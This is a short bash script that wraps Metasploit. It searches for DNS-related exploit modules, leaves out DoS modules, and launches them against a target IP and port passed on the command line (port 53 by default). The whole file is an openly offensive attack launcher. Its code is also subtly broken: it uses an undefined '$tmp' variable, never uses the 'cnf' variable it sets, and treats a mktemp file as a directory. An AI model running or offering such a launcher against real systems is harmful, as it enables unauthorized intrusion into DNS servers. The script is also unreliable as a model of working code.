#!/bin/bash
usage() {
    echo "Usage: $0 <ip> [port] [-e excludes]"
    exit 1
}
[[ "$#" -lt 1 ]] && usage

while [[ "$#" -gt 0 ]];do
    case "$1" in
        -e) shift; excludes="$1"; shift;;
        *)
            if [[ ! "$host" ]];then host="$1"
            elif [[ ! "$port" ]];then port="$1"
            else usage; fi
            shift
            ;;
    esac
done
[[ "$host" ]] || usage
[[ "$port" ]] || port=53

bin="$HOME/.local/share/msf/run.sh"
cnf="$(mktemp)/msf-dns-exploit"

cat<<EOF > "$tmp.ftcnf"
:search
type exploit
name dns
exclude dos $excludes

:args
RHOSTS $host
RPORT $port
EOF
$bin "$tmp.ftcnf"
